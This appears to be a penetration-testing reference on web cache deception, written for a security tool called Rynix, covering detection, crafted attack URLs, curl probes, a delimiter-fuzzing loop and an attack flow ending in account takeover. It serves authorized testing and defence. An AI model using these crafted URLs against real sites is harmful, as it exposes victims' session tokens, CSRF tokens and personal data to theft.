---
id: PS-CACHEDEC
category: Web cache deception
lab_count: 5
wstg_refs: [WSTG-INPV-17]
---

# Web Cache Deception: Attack Technique Reference

Web cache deception tricks a cache server into storing a sensitive dynamic response (such as a user profile or account page) by crafting a URL that looks like a static resource to the cache but resolves to a dynamic endpoint on the origin. The attacker sends the crafted URL to a victim. When the victim clicks it, the cache stores their authenticated response. The attacker then requests the same URL (unauthenticated) and receives the cached copy containing the victim's private data -- session tokens, CSRF tokens, PII, API keys, or other account-specific information.

**Key distinction from cache poisoning:** Cache poisoning injects malicious content INTO cached responses. Cache deception tricks the cache into storing legitimate sensitive responses that the attacker can then read.

---

## 1. Detection

### 1A. Identify Caching Infrastructure

```
# Check for cache presence and behavior
curl -sk -D- https://target.com/ | grep -iE 'x-cache|age|cf-cache|cache-control|via|x-varnish'

# Confirm caching with two sequential requests
# First request:
curl -sk -D- https://target.com/some-page -o /dev/null 2>&1 | grep -i 'x-cache'
# X-Cache: MISS

# Second request (same URL):
curl -sk -D- https://target.com/some-page -o /dev/null 2>&1 | grep -i 'x-cache'
# X-Cache: HIT → caching confirmed
```

### 1B. Identify Cache Rules

Caches decide what to store based on rules. Common rule types:

| Rule Type | What It Matches | Example |
|-----------|----------------|---------|
| Static extension | File extension in URL path | `.css`, `.js`, `.png`, `.jpg`, `.ico` |
| Static directory prefix | Path begins with static prefix | `/static/`, `/assets/`, `/media/`, `/resources/` |
| Exact file name | Specific file names | `robots.txt`, `favicon.ico`, `index.html` |
| Content-Type header | Response Content-Type | `text/css`, `image/png`, `application/javascript` |
| Cache-Control header | Origin cache directives | `public, max-age=3600` |

```
# Test which extensions trigger caching
for ext in css js png jpg gif ico svg woff woff2 ttf; do
  echo -n "$ext: "
  curl -sk -D- "https://target.com/test.$ext" -o /dev/null 2>&1 | grep -i 'x-cache'
done
```

### 1C. Identify Path Mapping Behavior

Test whether the origin server ignores extra path segments appended to dynamic endpoints:

```
# Baseline: authenticated profile page
curl -sk -H 'Cookie: session=VICTIM_TOKEN' https://target.com/my-account

# Appended path test: does it still return the profile?
curl -sk -H 'Cookie: session=VICTIM_TOKEN' https://target.com/my-account/anything
curl -sk -H 'Cookie: session=VICTIM_TOKEN' https://target.com/my-account/test.css
curl -sk -H 'Cookie: session=VICTIM_TOKEN' https://target.com/my-account/x.js

# If these return the same profile content → origin ignores the suffix
# If the cache stores it as static → web cache deception is possible
```

### 1D. Identify Normalization Differences

The core of cache deception relies on the cache and origin interpreting the same URL differently. Test for normalization discrepancies:

```
# Dot-segment resolution test
curl -sk https://target.com/aaa/../my-account
# If origin resolves to /my-account but cache stores under /aaa/../my-account

# Encoded slash test
curl -sk https://target.com/my-account%2f..%2fstatic/test.css
# Cache may see /static/test.css (cacheable), origin may see /my-account
```

---

## 2. Techniques

### 2A. Path Mapping Exploits (REST-Style Routing)

Frameworks that use REST-style routing (Spring, Express, Django, Rails) often map URL paths to handlers using only the base path, ignoring trailing segments.

```
# Origin maps /my-account to the profile handler, ignoring /anything.css
# Cache sees /my-account/anything.css → matches .css extension → caches it

# Attack URL sent to victim:
https://target.com/my-account/x.css
https://target.com/api/user/profile/cached.js
https://target.com/settings/account/dummy.png
```

**How it works:**
1. Victim clicks `https://target.com/my-account/x.css` while logged in
2. Origin server routes to `/my-account` handler (ignoring `/x.css`), returns profile with sensitive data
3. Cache sees `.css` extension in URL path, stores the response
4. Attacker requests `https://target.com/my-account/x.css` (no auth) and receives the victim's cached profile

> Lab refs: PS-CACHEDEC-01

### 2B. Path Delimiter Discrepancies

Different web servers and frameworks treat delimiter characters differently. A character that terminates the path for the origin may be treated as a literal path character by the cache.

**Common delimiters by framework:**

| Delimiter | Treated as Delimiter By | Treated as Literal By |
|-----------|------------------------|----------------------|
| `;` (semicolon) | Java Spring, Tomcat (matrix params) | Nginx, Varnish, Cloudflare |
| `?` (question mark) | All servers (query string) | Sometimes escaped in cache key |
| `#` (hash, as `%23`) | Origin may decode to fragment | Cache treats `%23` literally |
| `%00` (null byte) | OpenLiteSpeed, some PHP | Most caches |
| `%0A` (newline) | Some application servers | Most caches |
| `%09` (tab) | Some application servers | Most caches |
| `.` (dot) | Ruby on Rails (format specifier) | Most caches treat as literal |
| `!` | Some custom routers | Most caches |

**Exploitation pattern:**
```
# Semicolon delimiter (Java Spring / Tomcat)
https://target.com/my-account;x.css

# Origin: parses path as /my-account (semicolon starts matrix params, ignored)
# Cache: sees /my-account;x.css → matches .css → caches it

# Encoded null byte (OpenLiteSpeed)
https://target.com/my-account%00x.css

# Encoded hash (various)
https://target.com/my-account%23x.css
```

**Delimiter discovery via fuzzing:**
```
# Fuzz all printable characters and common encoded sequences
# For each character, test: /my-account<CHAR>x.css
# Compare response to baseline /my-account
# If response matches → character acts as delimiter for the origin
# Then check if cache stores the response → deception possible

chars="; ! @ # $ % ^ & * ( ) _ - + = { } [ ] | : < > , . ? / ~"
for c in $chars; do
  url="https://target.com/my-account${c}x.css"
  echo -n "$c : "
  curl -sk -o /dev/null -w '%{http_code}' "$url"
  echo
done

# Also test URL-encoded variants: %23, %3B, %00, %0A, %09, %2E
```

> Lab refs: PS-CACHEDEC-02

### 2C. Path Normalization Discrepancies

When the cache and origin handle dot-segments (`..`, `.`) and encoded characters differently, URLs can be crafted that resolve to a dynamic path on one side and a static path on the other.

**Origin normalizes, cache does not:**
```
# URL: /static/..%2fmy-account
# Origin decodes %2f to /, resolves dot-segment: /static/../my-account → /my-account (dynamic)
# Cache sees /static/..%2fmy-account literally → matches /static/ prefix → caches it

https://target.com/static/..%2fmy-account
https://target.com/assets/..%2fapi/user/profile
https://target.com/resources/..%2fsettings
```

**Cache normalizes, origin does not:**
```
# URL: /my-account/..%2f..%2fstatic/test.css
# Cache normalizes: /my-account/../../static/test.css → /static/test.css → caches it
# Origin sees literal path: /my-account/..%2f..%2fstatic/test.css → 404 or processes as /my-account subroute

# This direction is less useful because the origin must still return sensitive content
```

**Dot-segment testing methodology:**
```
# Test if origin resolves encoded dot-segments
curl -sk https://target.com/aaa/..%2fmy-account
# 200 with profile content → origin decodes and resolves

# Test if cache resolves encoded dot-segments
curl -sk https://target.com/aaa/..%2fstatic/js/app.js
# X-Cache: HIT → cache also normalizes (both normalize = no discrepancy)
# X-Cache: MISS (and never becomes HIT) → cache does NOT normalize (discrepancy found)
```

> Lab refs: PS-CACHEDEC-03, PS-CACHEDEC-04

### 2D. Static Extension Mapping

The simplest form of cache deception. If the cache stores any response whose URL ends with a static file extension, and the origin ignores that extension suffix:

```
# Append static extension to dynamic endpoint
https://target.com/my-account.css
https://target.com/api/me.js
https://target.com/dashboard.png
https://target.com/profile.woff

# Some origins use the extension for content negotiation (Rails .json, .xml)
# Others ignore it entirely (path-based routing)
```

**Testing:**
```
# Does origin still serve dynamic content with extension?
curl -sk -H 'Cookie: session=TOKEN' https://target.com/my-account.css
# Returns profile HTML → origin ignores .css extension

# Does cache store it?
curl -sk -D- https://target.com/my-account.css | grep -i x-cache
# X-Cache: HIT → cache stored it based on .css extension
```

### 2E. Static Directory Prefix Attacks

Caches often have rules to cache anything under `/static/`, `/assets/`, `/media/`, etc. If the origin ignores or strips these prefixes:

```
# URL: /static/my-account
# Cache: matches /static/ prefix → caches response
# Origin: ignores /static prefix, routes to /my-account handler

https://target.com/static/my-account
https://target.com/assets/api/user/me
https://target.com/media/settings
https://target.com/resources/dashboard

# Combined with dot-segment normalization:
https://target.com/static/..%2fmy-account
```

> Lab refs: PS-CACHEDEC-05

### 2F. Exact-Match File Name Exploitation

Some caches have rules for specific file names (`robots.txt`, `favicon.ico`, `index.html`). Combined with normalization discrepancies:

```
# Cache matches exact file name at end of path
# Origin resolves dot-segments to reach dynamic endpoint

https://target.com/my-account%2f%2e%2e%2frobots.txt
# Cache: sees robots.txt at end → caches
# Origin: decodes to /my-account/../robots.txt → /robots.txt (may not work)

# Better: combined with origin that resolves dot-segments differently
https://target.com/my-account/..%2f..%2frobots.txt
```

---

## 3. Delimiter Reference

### Per-Framework Path Delimiters

| Framework / Server | Delimiters Recognized | Notes |
|-------------------|----------------------|-------|
| Java Spring / Tomcat | `;` (matrix params) | Everything after `;` is matrix params, stripped from path resolution |
| Ruby on Rails | `.` (format specifier) | `/resource.json` sets format, `/resource.css` may route to `/resource` |
| PHP / Apache | `?`, standard only | Generally treats entire path literally |
| Node.js / Express | Standard only | Path parameters via `:param`, no special delimiters |
| Python / Django | Standard only | URLconf pattern matching |
| Python / Flask | Standard only | Werkzeug routing |
| OpenLiteSpeed | `%00` (null byte) | Truncates path at null byte |
| Nginx | Standard, passes through | Usually passes full path to upstream |
| IIS | `;` (sometimes) | Legacy behavior, configurable |

### Encoded Characters to Test

```
# Priority encoded sequences for delimiter testing:
%23    # (hash/fragment)
%3B    ; (semicolon)
%3F    ? (question mark)
%00    null byte
%0A    newline
%0D    carriage return
%09    tab
%20    space
%2F    / (forward slash)
%5C    \ (backslash)
%2E    . (dot)
```

---

## 4. Testing Methodology

### Step-by-Step Cache Deception Assessment

1. **Confirm caching exists**: Check for `X-Cache`, `Age`, CDN headers on static resources
2. **Identify cache rules**: Determine what triggers caching (extensions, prefixes, exact names)
3. **Test origin path handling**: Does the origin ignore appended path segments, delimiters, or extensions?
4. **Probe delimiter discrepancies**: Fuzz delimiter characters between origin path and static suffix
5. **Test normalization differences**: Try encoded dot-segments to create path interpretation gaps
6. **Construct deception URL**: Combine origin routing behavior with cache storage rules
7. **Verify with test account**: Visit the crafted URL while authenticated, check if response is cached
8. **Confirm data leakage**: Request the same URL unauthenticated -- does the cached authenticated response appear?
9. **Assess sensitive data scope**: What data is exposed (API keys, CSRF tokens, PII, session data)?
10. **Document attack URL**: Provide the exact URL an attacker would send to a victim

### Attack Flow

```
1. Attacker discovers: /my-account returns sensitive data
2. Attacker discovers: /my-account;x.css is cached (delimiter discrepancy)
3. Attacker sends victim a link: https://target.com/my-account;x.css
4. Victim clicks link while authenticated
5. Origin serves /my-account (profile data), cache stores as /my-account;x.css
6. Attacker requests: https://target.com/my-account;x.css (no auth)
7. Cache returns victim's profile with session token, CSRF token, email, etc.
8. Attacker uses stolen data for account takeover
```

### Verification Checklist

- [ ] Caching infrastructure identified and behavior confirmed
- [ ] Cache rules identified (what triggers storage)
- [ ] Origin path abstraction confirmed (ignores suffix/delimiter)
- [ ] Delimiter or normalization discrepancy found between cache and origin
- [ ] Crafted URL returns dynamic content (origin) AND gets cached (cache)
- [ ] Cached response contains sensitive data (session tokens, PII, CSRF tokens)
- [ ] Unauthenticated request to same URL returns the cached authenticated response
- [ ] Impact assessed: what data leaks, whether it enables account takeover
## Rynix workflow

1. `get_technique_guide` for `web-cache-deception` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `compare_role_response`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `compare_role_response`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

